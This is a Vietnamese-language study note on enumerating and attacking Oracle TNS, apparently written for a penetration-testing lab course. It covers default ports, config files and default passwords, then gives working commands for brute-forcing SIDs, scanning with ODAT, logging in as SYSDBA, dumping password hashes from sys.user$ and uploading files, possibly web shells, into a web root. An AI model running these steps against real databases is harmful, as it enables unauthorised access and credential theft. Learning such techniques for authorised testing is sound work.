# Oracle TNS (Transparent Network Substrate)

## Tổng quan
Oracle TNS (Transparent Network Substrate) là giao thức giao tiếp của Oracle, dùng để kết nối giữa **Oracle Database** và **client/application** qua mạng.

### Chức năng chính
- Name Resolution (phân giải tên dịch vụ)
- Connection Management (quản lý kết nối)
- Load Balancing
- Mã hóa SSL/TLS
- Theo dõi hiệu năng và ghi log
- Hỗ trợ nhiều giao thức mạng (TCP/IP, UDP...)

> Mặc định Oracle TNS lắng nghe trên **TCP/1521**.

---

# Cấu hình mặc định

## File cấu hình

### Client
`tnsnames.ora`

- Ánh xạ Service Name → IP + Port.
- Chứa thông tin để client kết nối tới database.

Ví dụ:

```text
ORCL
 ├── Host: 10.129.11.102
 ├── Port: 1521
 └── Service Name: orcl
```

---

### Server

`listener.ora`

Quản lý Listener:

- Host
- Port
- SID
- Service
- Oracle Home
- Database được phục vụ

Listener sẽ nhận kết nối và chuyển tới đúng Database Instance.

---

## Một số thông tin mặc định cần nhớ

| Thành phần | Giá trị |
|------------|----------|
| Port | TCP 1521 |
| File client | tnsnames.ora |
| File server | listener.ora |
| Oracle 9 | Password mặc định `CHANGE_ON_INSTALL` |
| Oracle DBSNMP | Password mặc định `dbsnmp` |

# Thông số quan trọng trong tnsnames.ora

| Setting | Ý nghĩa |
|---------|---------|
| DESCRIPTION | Mô tả kết nối |
| ADDRESS | Địa chỉ host + port |
| PROTOCOL | TCP/IPC... |
| PORT | Cổng kết nối |
| CONNECT_DATA | Thông tin database |
| INSTANCE_NAME | Tên instance |
| SERVICE_NAME | Tên service |
| SERVER | Dedicated / Shared |
| USER | Username |
| PASSWORD | Password |
| SECURITY | Kiểu bảo mật |
| VALIDATE_CERT | Kiểm tra SSL certificate |
| SSL_VERSION | Phiên bản SSL/TLS |
| CONNECT_TIMEOUT | Timeout kết nối |
| RECEIVE_TIMEOUT | Timeout nhận dữ liệu |
| SEND_TIMEOUT | Timeout gửi dữ liệu |
| TRACE_LEVEL | Mức log |
| TRACE_DIRECTORY | Thư mục log |

# SID (System Identifier)

SID là tên duy nhất của một **Oracle Database Instance**.

Client kết nối bằng:

```
IP + PORT + SID
```

Ví dụ

```
10.129.204.235:1521/XE
```

Nếu SID sai → Không thể kết nối.

# Enumeration Oracle TNS

## 1. Scan port

```bash
nmap -p1521 -sV <IP> --open
```

Ví dụ

```
1521/tcp open oracle-tns
```

---

## 2. Brute-force SID

```bash
nmap --script oracle-sid-brute -p1521 <IP>
```

Ví dụ tìm được

```
XE
```

---

## 3. ODAT (Oracle Database Attacking Tool)

Công cụ pentest Oracle mạnh nhất.

Có thể:

- Enum SID
- Enum Database
- Brute-force Password
- Enum User
- Kiểm tra lỗ hổng
- Upload file
- RCE
- Privilege Escalation
- SQL Injection

Quét toàn bộ:

```bash
./odat.py all -s <IP>
```

Ví dụ phát hiện:

```
scott/tiger
```

# Kết nối Oracle

Dùng SQLPlus

```bash
sqlplus user/password@IP/SID
```

Ví dụ

```bash
sqlplus scott/tiger@10.129.204.235/XE
```

Kiểm tra phiên bản

```sql
select version from v$instance;
```

# Enumeration sau khi đăng nhập

## Danh sách bảng

```sql
select table_name from all_tables;
```

---

## Quyền của user

```sql
select * from user_role_privs;
```

---

## Thử SYSDBA

Nếu tài khoản có quyền:

```bash
sqlplus scott/tiger@IP/XE as sysdba
```

Sau đó kiểm tra quyền:

```sql
select * from user_role_privs;
```

Nếu có role:

```
DBA
```

→ Có toàn quyền Database.

---

# Dump Password Hash

Nếu có quyền cao:

```sql
select name,password from sys.user$;
```

Có thể lấy hash để crack offline.

---

# Upload File bằng ODAT

Nếu server cho phép ghi file:

```bash
./odat.py utlfile \
-s <IP> \
-d XE \
-U scott \
-P tiger \
--sysdba \
--putFile C:\inetpub\wwwroot testing.txt ./testing.txt
```

Kiểm tra:

```bash
curl http://<IP>/testing.txt
```

Nếu hiển thị nội dung file → Upload thành công.

# Đường dẫn Web Root mặc định

|--------------|----------|
| Linux | `/var/www/html` |
| Windows | `C:\inetpub\wwwroot` |

Có thể upload web shell nếu biết đúng thư mục.

# Những điểm cần nhớ khi Pentest

- Oracle TNS mặc định chạy trên **TCP/1521**.
- Cần xác định đúng **SID** trước khi kết nối.
- `tnsnames.ora` (client) và `listener.ora` (server) là hai file cấu hình quan trọng.
- Password mặc định như **dbsnmp/dbsnmp** hoặc **CHANGE_ON_INSTALL** (Oracle 9) vẫn có thể gặp trên hệ thống cũ.
- **ODAT** là công cụ chính để enumerate và khai thác Oracle.
- Sau khi có quyền cao (SYSDBA), có thể:
  - Dump password hash.
  - Liệt kê database, user và quyền.
  - Upload file/web shell (nếu cấu hình cho phép).
